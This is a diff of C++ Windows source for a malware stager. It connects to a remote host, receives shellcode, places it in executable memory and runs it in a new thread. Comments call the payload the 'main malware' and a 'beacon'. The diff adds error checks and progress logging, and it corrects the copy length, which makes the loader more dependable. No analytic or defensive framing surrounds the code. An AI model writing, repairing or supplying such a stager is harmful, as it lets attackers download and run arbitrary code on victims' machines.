@@ -18,74 +18,89 @@
 
 bool Stager::run(const std::string& host, const std::string& port)
 {
-    // manually resolve apis (skip for now and just include the headers that import it)
+    // 1. manually resolve apis (skip for now and just include the headers that import it)
 
-    // connect to server
+    std::cout << "1 - Starting" << std::endl;
+    
     WSADATA wsaData;
-    WSAStartup(MAKEWORD(2,2), &wsaData);
-    // create socket
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+        std::cout << "WSAStartup failed" << std::endl;
+        return false;
+    }
+
     SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    ADDRINFOA hints, *result = nullptr; // struct addrinfo 
+    if (sock == INVALID_SOCKET) {
+        std::cout << "socket failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
 
+    std::cout << "2 - Socket created" << std::endl;
+
+    ADDRINFOA hints, *result = nullptr;
     ZeroMemory(&hints, sizeof(hints));
-    // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform
-
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    std::cout << "2" << std::endl;
-    // Resolve address
-    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0)
-    {
+    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) {
+        std::cout << "getaddrinfo failed" << std::endl;
         return false;
     }
 
-    std::cout << "3" << std::endl;
-    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
-    {
-        // create connection
-        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR)
-        {
+    std::cout << "3 - Address resolved" << std::endl;
+
+    bool connected = false;
+    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
+        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) {
+            connected = true;
             break;
         }
     }
     freeaddrinfo(result);
 
+    if (!connected) {
+        std::cout << "connect failed" << std::endl;
+        return false;
+    }
 
-    // download main malware
+    // 2.
+    std::cout << "4 - Connected" << std::endl;
 
-    //const unsigned int MAX_BEACON_SIZE = 500000;
-	std::vector<unsigned char> shellcode(4096);
-
-    std::cout << "4" << std::endl;
-    //recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
+    // 3. 
+    std::vector<unsigned char> shellcode(4096);
     int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
     
-    std::cout << "5" << std::endl;
-    // allocate memory?
-    //LPVOID beacon_mem = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    LPVOID beacon_mem = VirtualAlloc(0, bytes_received, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    if (beacon_mem == NULL)
-    {
-        std::cout << "virtualalloc failed" << std::endl;
+    if (bytes_received <= 0) {
+        std::cout << "recv failed, received: " << bytes_received << std::endl;
+        return false;
     }
-    // TODO: this only recv when bytes recv is already over max?
-    //recv(sock, (char*)beacon_mem, beacon_size, 0);
-    
-    // COPY the received shellcode to executable memory
-    memcpy(beacon_mem, shellcode.data(), shellcode.size());
-    std::cout << "6" << std::endl;
-    // execute malware
+
+    std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
+
+    LPVOID beacon_mem = VirtualAlloc(0, bytes_received, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!beacon_mem) {
+        std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    memcpy(beacon_mem, shellcode.data(), bytes_received);
+
+    std::cout << "6 - Memory allocated and copied" << std::endl;
+
+    // 4.
     HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
-   
+    if (!thread) {
+        std::cout << "CreateThread failed: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    std::cout << "7 - Thread created, waiting..." << std::endl;
     WaitForSingleObject(thread, INFINITE); // Wait for thread to complete
-    std::cout << "7" << std::endl;
-    // cleanup
+
+    std::cout << "8 - Cleaning up" << std::endl;
     closesocket(sock);
     WSACleanup();
-    std::cout << "8" << std::endl;
-    return 0;
+    return true;
 }
 
 int main()
